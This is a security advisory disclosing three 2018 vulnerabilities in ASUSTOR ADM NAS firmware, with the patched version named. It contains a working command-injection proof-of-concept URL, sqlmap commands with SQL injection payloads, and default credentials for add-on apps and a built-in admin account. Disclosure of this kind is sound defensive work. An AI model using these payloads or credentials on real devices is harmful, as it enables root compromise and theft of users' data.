@@ -1,0 +1,127 @@
+Product - ASUSTOR ADM - 3.1.0.RFQ3 and all previous builds
+Vendor - https://www.asustor.com/
+Patch Notes - http://download.asustor.com/download/docs/releasenotes/RN_ADM_3.1.3.RHU2.pdf
+
+Issue:  The Asustor NAS appliance on ADM 3.1.0 and before suffer from
+multiple critical vulnerabilities. The vulnerabilities were submitted
+to Asustor in January and February 2018. Several follow-up requests
+were made in an attempt to obtain vendor acknowledgement, however no
+correspondance was ever received. Nevertheless, the vendor did patch
+the RCE issue in the 3.1.3 ADM release on May 31, 2018.
+
+Resolution: Upgrade to newest Asustor firmware, ADM 3.1.3.
+-----------------------------------------------------------------------------------
+
+CVE-2018-11510
+Remote Command Execution (Unauthenticated)
+CWE-78 - Improper Neutralization of Special Elements used in an OS Command
+ASUSTOR ADM - 3.1.0.RFQ3
+------------------------------------------
+
+Weakness : The ASUSTOR ADM 3.1.0.RFQ3 NAS portal suffers from an
+unauthenticated remote code execution vulnerability in the
+portal/apis/aggrecate_js.cgi file by embedding OS commands in the
+'script' parameter. The application fails to santitize user input
+after the cgi file executes a call to a local shell script.
+
+Example POC:
+https://<IP>:8001/portal/apis/aggrecate_js.cgi?script=launcher%22%26ls%20-ltr%26%22
+
+Exploitation of this vulnerability allows an attacker execution of
+arbitrary commands on the host operating system, as the root user,
+remotely and unauthenticated. This is a complete compromise of the
+appliance.
+
+Exploits with Metasploit module can be found here:
+https://github.com/mefulton/CVE-2018-11510/
+------------------------------------------------------------------------------------
+
+CVE-2018-11511
+Blind SQL Injections
+CWE-89: Improper Neutralization of Special Elements used in an SQL Command
+ASUSTOR Photo Gallery Application - ADM 3.1.0.RFQ3
+------------------------------------------
+
+Weakness : The tree list functionality in the photo gallery
+application in ASUSTOR ADM 3.1.0.RFQ3 has a SQL injection
+vulnerability that affects the 'album_id' or 'scope' parameter via a
+photo-gallery/api/album/tree_lists/ URI.
+
+POC
+sqlmap -u "https://<IP>/photo-gallery/api/album/tree_lists/"
+--data="album_id=123456789&start=0&limit=100&order=name_asc&api=v2"
+  --random-agent --risk=2 --dbms=mysql
+
+Parameter: album_id (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: album_id=106299411 AND
+4644=4644&start=0&limit=100&order=name_asc&api=v2
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: album_id=106299411 AND
+SLEEP(5)&start=0&limit=100&order=name_asc&api=v2
+
+
+sqlmap -u "https://IP/photo-gallery/api/photo/search/"
+--data="keyword=jpg&scope=123456789&start=0&limit=100&order=name_asc&api_mode=browse&api=v2"
+--random-agent --dbms=mysql --risk=2
+
+Parameter: scope (POST)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: keyword=jpg&scope=106299414 AND
+SLEEP(5)&start=0&limit=100&order=name_asc&api_mode=browse&api=v2
+------------------------------------------------------------------------------------
+
+CVE-2018-11509
+Default credentials and remote access (Multiple Applications)
+CWE-255 Credentials Management
+ASUSTOR ADM 3.1.0.RFQ3
+------------------------------------------
+
+Weakness : When the end user completes setup for the ASUSTOR Nas
+appliance, a single congratulations web page appears, usually on port
+80, stating setup is complete. This "setup complete" web page however
+is served publicly, and is available to anyone with no authentication.
+>From this page it is possible to access all of the add-on applications
+the end usr installs on the NAS, which are available from their online
+repository, by simply browsing to each add-on directory.
+
+For many of these apps, for example phpmyadmin. virtualbox, owncloud,
+photo-gallery, etc., the files are installed under the /volume1/Web/
+folder, which is t the same directory as the 'setup complete' page is
+located.
+
+URL http://<IP>/phpmyadmin/ username/password - root:admin
+URL http://<IP>/virtualbox/ username/password - admin:admin
+URL http://<IP>/wordpress/ setup file available
+
+The application does prompt the user to change the admin account for
+the NAS itself, however, the end user is never prompted to change the
+default passwords on the add-on  applications.
+
+This allows an attacker root level access to the application which in
+turn can be used to upload a webshell onto the appliance. It also
+allow access to all data the end user uploads to the NAS.
+
+Furthermore, the NAS itself has a default account nvradmin, which has
+permission to log into the admin portal. While the nvradmin account
+does not have most admin permissions, it still allows an attacker to
+access many of the browser file functions, and gain a foothold on the
+appliance.
+
+URL http://<IP>:8001/portal/ username/password nvradmin:nvradmin
+
+An attacker can determine installed applications and attack default
+credentials that are not changed upon NAS initialization, which
+enables them to  compromise end user data or gain root access on the
+appliance.
+-----------------------------------------------------------------------------------
+
+[Researchers]
+Kyle Lovett - (twitter - @SquirrelBuddha)
+Matthew Fulton (twitter - @haqur)
+https://www.purehacking.com/blog/matthew-fulton/
+https://github.com/mefulton/CVE-2018-11510/
